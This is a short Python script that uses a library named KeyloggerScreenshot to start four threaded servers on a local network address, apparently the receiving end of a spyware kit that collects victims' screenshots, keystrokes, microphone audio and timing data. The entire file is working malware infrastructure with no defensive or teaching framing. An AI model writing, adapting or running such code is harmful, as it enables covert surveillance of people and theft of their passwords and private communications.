import KeyloggerScreenshot as ks
import threading

ip = "192.168.0.75"

server_photos = ks.ServerPhotos(ip, 4692)

server_keylogger = ks.ServerKeylogger(ip, 7689, simulater=True)

server_listener = ks.ServerListener(ip, 6371)

server_time = ks.Timer(ip, 8436)

threading_server = threading.Thread(target=server_photos.start)
threading_server.start()

threading_server2 = threading.Thread(target=server_keylogger.start)
threading_server2.start()

threading_server3 = threading.Thread(target=server_listener.start)
threading_server3.start()

threading_server4 = threading.Thread(target=server_time.start_timer)
threading_server4.start() 